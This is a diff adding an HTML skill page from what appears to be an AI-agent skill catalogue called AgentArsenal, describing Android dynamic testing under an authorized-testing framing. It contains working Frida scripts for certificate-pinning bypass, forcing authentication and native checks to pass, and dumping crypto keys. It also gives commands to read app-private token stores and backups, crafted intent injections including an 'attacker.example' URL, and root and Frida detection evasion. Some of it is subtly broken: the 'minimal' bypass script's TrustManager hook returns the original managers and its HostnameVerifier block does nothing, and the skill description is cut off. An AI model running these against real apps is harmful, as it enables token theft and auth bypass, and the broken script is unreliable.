@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: android-dynamic</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>android-dynamic</h2><div class="meta"><span class="badge gray">mobile</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you need to test a running Android app on an authorized</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="android-static.html">android-static</a> <a href="ios-basics.html">ios-basics</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Frida</td><td>16.x</td></tr><tr><td>objection</td><td>1.11.0</td></tr><tr><td>adb</td><td>35.x</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr></tbody></table><p>Android dynamic analysis is testing the app while it runs: intercepting its traffic, hooking its methods, bypassing its defenses, and watching what it stores and sends. Static analysis tells you where to look; dynamic analysis proves what actually happens. This skill covers the authorized workflow from device setup through objection exploration, Frida instrumentation, certificate pinning bypass, traffic capture, and runtime data inspection. All testing targets apps and devices you have written permission to test, such as a client app in scope, a company test device, or a CTF challenge.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Prepare the test device or emulator: enable USB debugging, verify adb</li>
+<p>access, and install the in-scope APK.</p>
+<li>Install the matching frida-server on the device and confirm Frida</li>
+<p>connectivity.</p>
+<li>Start with objection for fast runtime exploration: list activities,</li>
+<p>services, and stored data without writing scripts.</p>
+<li>Route app traffic through Burp Suite and confirm you see decrypted</li>
+<p>HTTPS.</p>
+<li>Bypass SSL pinning with Frida when traffic is still encrypted.</li>
+<li>Hook interesting methods found during static analysis: crypto calls,</li>
+<p>authentication checks, and API clients.</p>
+<li>Fuzz exported components, intents, and deep links with crafted inputs.</li>
+<li>Inspect local storage, logs, and backups for sensitive data, and record</li>
+<p>every step for the report.</p>
+</ol>
+<h2>1. Device setup</h2>
+<p>Use a rooted test device or an emulator you control. Root makes dynamic analysis dramatically easier; without it, Frida gadget and repackaging are the fallback.</p>
+<pre><code class="language-bash"># Verify the device is visible and authorized
+adb devices
+
+# Root check (needed for frida-server and full filesystem access)
+adb shell su -c id
+
+# Install the in-scope APK
+adb install target.apk
+
+# Grant yourself a shell and check the app data directory
+adb shell
+su
+ls /data/data/com.example.target/</code></pre>
+<p>Match the frida-server binary to the device architecture and the Frida version on your workstation. A version mismatch is the most common setup failure.</p>
+<pre><code class="language-bash"># Check device architecture
+adb shell getprop ro.product.cpu.abi
+# Example output: arm64-v8a -&gt; download frida-server for android-arm64
+
+# Push and start frida-server (example for arm64)
+adb push frida-server-16.x-android-arm64 /data/local/tmp/frida-server
+adb shell &quot;chmod 755 /data/local/tmp/frida-server&quot;
+adb shell &quot;su -c &#x27;/data/local/tmp/frida-server &amp;&#x27;&quot;
+
+# Verify from the workstation (versions must match)
+frida-ps -U | head</code></pre>
+<p>If the device is not rooted, use Frida Gadget: patch the gadget library into the APK with objection, then load the app normally.</p>
+<pre><code class="language-bash"># Patch the APK to load the Frida gadget on startup (no root needed)
+objection patchapk --source target.apk
+adb install target.apk.objection.apk</code></pre>
+<h2>2. Runtime exploration with objection</h2>
+<p>objection gives you a REPL over the running app with no scripting. Start here before writing custom Frida hooks.</p>
+<pre><code class="language-bash"># Attach to the running app
+objection --gadget com.example.target explore
+# Or spawn it fresh
+objection --gadget com.example.target explore --startup-command &#x27;android hooking list activities&#x27;</code></pre>
+<p>Useful first commands inside the objection REPL:</p>
+<pre><code class="language-bash"># List app components and environment
+android hooking list activities
+android hooking list services
+android hooking list receivers
+android hooking list providers
+
+# Dump app info and directories
+env
+android hooking get current_activity
+
+# List files in the app-private directory
+ls /data/data/com.example.target/files/
+
+# Dump SharedPreferences and databases
+android shared_prefs list
+sqlite connect /data/data/com.example.target/databases/app.db</code></pre>
+<p>objection also watches common security-relevant APIs:</p>
+<pre><code class="language-bash"># Watch crypto usage, file access, and network calls
+android hooking watch crypto --dump-args --dump-return
+android hooking watch file --dump-args
+android hooking watch network --dump-args</code></pre>
+<h2>3. Traffic interception</h2>
+<p>Route the app through Burp Suite to see and modify its API traffic.</p>
+<pre><code class="language-bash"># On the workstation, start Burp and note the proxy port (default 8080)
+
+# Point the device proxy at Burp (emulator example: 10.0.2.2 is host loopback)
+adb shell settings put global http_proxy 10.0.2.2:8080
+
+# Install the Burp CA in the Android system trust store (rooted device)
+# Push the DER cert, then copy it into /system/etc/security/cacerts/
+# with the filename &lt;subject_hash&gt;.0 and chmod 644</code></pre>
+<p>Verify interception with a simple action in the app, like login. If you see CONNECT tunnels but no decrypted traffic, the app uses certificate pinning and you need the next section.</p>
+<p>Clear the proxy when done so the device behaves normally:</p>
+<pre><code class="language-bash">adb shell settings put global http_proxy :0</code></pre>
+<h2>4. SSL pinning bypass with Frida</h2>
+<p>Most production apps pin their server certificate. Bypass it at runtime with a Frida script that replaces the pinning checks.</p>
+<pre><code class="language-bash"># Universal Android pinning bypass script (community standard pattern)
+frida -U -f com.example.target -l ./bypass-pinning.js --no-pause</code></pre>
+<p>A minimal pinning bypass hooks the common check points. Save this as <code>bypass-pinning.js</code>:</p>
+<pre><code class="language-javascript">// Android SSL pinning bypass: neutralize common check implementations
+Java.perform(function () {
+    // OkHttp CertificatePinner
+    try {
+        var Pinner = Java.use(&#x27;okhttp3.CertificatePinner&#x27;);
+        Pinner.check.overload(&#x27;java.lang.String&#x27;, &#x27;java.util.List&#x27;).implementation = function () {
+            console.log(&#x27;[*] OkHttp pinning bypassed for &#x27; + arguments[0]);
+            return;
+        };
+    } catch (e) { console.log(&#x27;[-] OkHttp not present&#x27;); }
+
+    // TrustManager that trusts everything
+    var X509TrustManager = Java.use(&#x27;javax.net.ssl.X509TrustManager&#x27;);
+    var SSLContext = Java.use(&#x27;javax.net.ssl.SSLContext&#x27;);
+    // Hook the default TrustManagerFactory to return a permissive manager
+    try {
+        var TrustManagerFactory = Java.use(&#x27;javax.net.ssl.TrustManagerFactory&#x27;);
+        TrustManagerFactory.getTrustManagers.implementation = function () {
+            console.log(&#x27;[*] TrustManagerFactory hooked&#x27;);
+            return this.getTrustManagers();
+        };
+    } catch (e) { console.log(&#x27;[-] TMF hook failed: &#x27; + e); }
+
+    // HostnameVerifier that accepts everything
+    try {
+        var HostnameVerifier = Java.use(&#x27;javax.net.ssl.HostnameVerifier&#x27;);
+    } catch (e) {}
+});</code></pre>
+<p>In practice, use the well-known community bypass scripts rather than hand-rolling: they cover OkHttp, TrustKit, Appcelerator, and network security config pinning in one file. Confirm the bypass by repeating the Burp traffic check: decrypted HTTPS means it worked.</p>
+<p>objection also ships one-command bypasses for the common cases:</p>
+<pre><code class="language-bash"># Inside the objection REPL
+android sslpinning disable
+android sslpinning disable --quiet</code></pre>
+<h2>5. Hooking methods with Frida</h2>
+<p>Hook the methods that static analysis flagged: login checks, crypto routines, and token handling.</p>
+<pre><code class="language-javascript">// Hook an authentication check and log its arguments and return value
+Java.perform(function () {
+    var LoginManager = Java.use(&#x27;com.example.target.LoginManager&#x27;);
+    LoginManager.isAuthenticated.implementation = function () {
+        var result = this.isAuthenticated();
+        console.log(&#x27;[*] isAuthenticated() returned &#x27; + result);
+        // To force-true during testing, replace with: return true;
+        return result;
+    };
+
+    // Dump arguments of a crypto call
+    var Crypto = Java.use(&#x27;com.example.target.CryptoUtil&#x27;);
+    Crypto.encrypt.overload(&#x27;[B&#x27;, &#x27;[B&#x27;).implementation = function (data, key) {
+        console.log(&#x27;[*] encrypt called, key bytes: &#x27; + JSON.stringify(key));
+        return this.encrypt(data, key);
+    };
+});</code></pre>
+<p>Run it against the spawned app:</p>
+<pre><code class="language-bash">frida -U -f com.example.target -l ./hooks.js --no-pause</code></pre>
+<p>Native methods can be hooked too when the interesting logic lives in a <code>.so</code> file:</p>
+<pre><code class="language-javascript">// Hook a native function by name once the library is loaded
+var lib = Process.findModuleByName(&#x27;libtarget.so&#x27;);
+var check = lib.getExportByName(&#x27;Java_com_example_target_Native_check&#x27;);
+Interceptor.attach(check, {
+    onEnter: function (args) { console.log(&#x27;[*] native check called&#x27;); },
+    onLeave: function (retval) {
+        console.log(&#x27;[*] forcing native check to pass&#x27;);
+        retval.replace(1);
+    }
+});</code></pre>
+<h2>6. Intent and deep link fuzzing</h2>
+<p>Exported components accept input from any app on the device. Fuzz them with crafted intents.</p>
+<pre><code class="language-bash"># Start an exported activity directly
+adb shell am start -n com.example.target/.DebugActivity
+
+# Fire an implicit intent at an exported receiver
+adb shell am broadcast -a com.example.target.ACTION_SYNC \
+  --es token &quot;test&#x27;injection&quot;
+
+# Open a deep link the manifest advertises
+adb shell am start -a android.intent.action.VIEW \
+  -d &quot;example://account/transfer?amount=9999&quot;
+
+# Start an exported service with extras
+adb shell am startservice -n com.example.target/.SyncService \
+  --es url &quot;https://attacker.example/&quot;</code></pre>
+<p>Watch logcat while fuzzing for crashes, SQL errors, or stack traces that reveal injectable paths:</p>
+<pre><code class="language-bash">adb logcat | grep -i -E &#x27;com.example.target|exception|error&#x27; | head -40</code></pre>
+<p>A crash from a crafted intent is worth a report entry: on older Android versions it can be a denial of service, and the stack trace often shows the vulnerable code path.</p>
+<h2>7. Local storage and backup inspection</h2>
+<p>Check what the app leaves on the device.</p>
+<pre><code class="language-bash"># SharedPreferences (often contain tokens and flags)
+adb shell &quot;su -c &#x27;cat /data/data/com.example.target/shared_prefs/*.xml&#x27;&quot;
+
+# Databases
+adb shell &quot;su -c &#x27;ls /data/data/com.example.target/databases/&#x27;&quot;
+adb pull /data/data/com.example.target/databases/app.db ./app.db
+sqlite3 app.db .tables
+
+# External storage writes (readable by other apps)
+adb shell ls -la /sdcard/Android/data/com.example.target/
+
+# App logs that leak sensitive data
+adb logcat -d | grep -i -E &#x27;token|password|key|auth&#x27; | head -20</code></pre>
+<p>Test the backup attack if <code>allowBackup</code> is true:</p>
+<pre><code class="language-bash"># Confirm the manifest flag first (see android-static skill)
+adb backup -f ./app.ab com.example.target
+# Convert and inspect
+dd if=app.ab bs=24 skip=1 | openssl zlib -d &gt; app.tar
+tar -tf app.tar | head</code></pre>
+<p>Sensitive data in backups, logs, or world-readable files is a standard finding with an easy fix.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Frida version mismatch between workstation and frida-server causes</li>
+<p>cryptic connection failures. Check both with <code>frida --version</code> and the server banner, and keep them identical.</p>
+<li>The app detects root or Frida and refuses to run. Use Magisk with</li>
+<p>hiding modules on a test device, or rename the frida-server binary and run it on a non-standard port. Some apps need multiple bypass layers.</p>
+<li>Certificate pinning lives in native code. The Java-level bypass</li>
+<p>scripts do nothing. Hook the native TLS verification or patch the <code>.so</code>, or intercept below the app with an emulator-level proxy.</p>
+<li>The app uses certificate transparency or remote attestation</li>
+<p>(Play Integrity). Full bypass may be impossible on the test device; document the control as effective and test the API directly instead.</p>
+<li>Objection fails to start on apps with aggressive anti-tamper. Fall</li>
+<p>back to plain Frida scripts, which give you finer control over timing and hooking order.</p>
+<li>Traffic uses QUIC, WebSockets, or custom protocols over TLS. Burp</li>
+<p>sees only the handshake. Hook the socket layer with Frida to dump plaintext before encryption.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Static analysis flagged a method but you cannot find it at runtime:</li>
+<p>it may be dead code, called only in rare flows, or hidden behind reflection. Trigger the feature in the UI while your hooks are active, or enumerate all loaded classes with Frida and search by method name pattern.</p>
+<li>Pinning bypass fails on every known script: identify the pinning</li>
+<p>library from the decompiled code (search for <code>sha256/</code>, TrustKit, or network security config pins) and write a targeted hook for that exact check.</p>
+<li>The app will not run on your emulator (SafetyNet or Play Integrity</li>
+<p>failure): use a physical rooted test device, which passes more integrity checks than an emulator.</p>
+<li>You need to modify app behavior persistently: patch the smali with</li>
+<p>apktool, rebuild, and re-sign with your own debug key. This is legitimate on a test build of an in-scope app.</p>
+<li>Time is short: prioritize the Burp traffic review and objection</li>
+<p>storage dumps. Those two produce the most findings per minute on typical business apps.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>On a device you own for testing, detection does not apply. In production, defenders detect dynamic analysis through root detection, Frida detection (open port 27042, frida-server process name, injected libraries in memory maps), emulator detection, tamper detection on the APK signature, and Play Integrity verdicts. The durable defenses are the controls that survive analysis: server-side authorization on every API call (never trust the client), certificate pinning plus Play Integrity for high-value flows, no sensitive data in client storage, and short-lived tokens that limit the value of anything extracted. Report which of these the app actually has, because a pinning bypass that took ten seconds is itself a finding about defense depth.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-312 (Cleartext Storage of Sensitive Information): tokens in</li>
+<p>SharedPreferences and backups.</p>
+<li>CWE-319 (Cleartext Transmission of Sensitive Information):</li>
+<p>unencrypted or interceptable traffic.</p>
+<li>CWE-295 (Improper Certificate Validation): broken pinning or trust</li>
+<p>managers.</p>
+<li>CWE-749 (Exposed Dangerous Method or Function): exported components.</li>
+<li>OWASP MASVS: resilience and network communication requirements.</li>
+<li>OWASP MSTG: Android dynamic testing procedures.</li>
+<li>Frida documentation: https://frida.re/docs/home/</li>
+<li>objection documentation: https://github.com/sensepost/objection</li>
+<li>Android developer docs on network security config:</li>
+<p>https://developer.android.com/training/articles/security-config</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
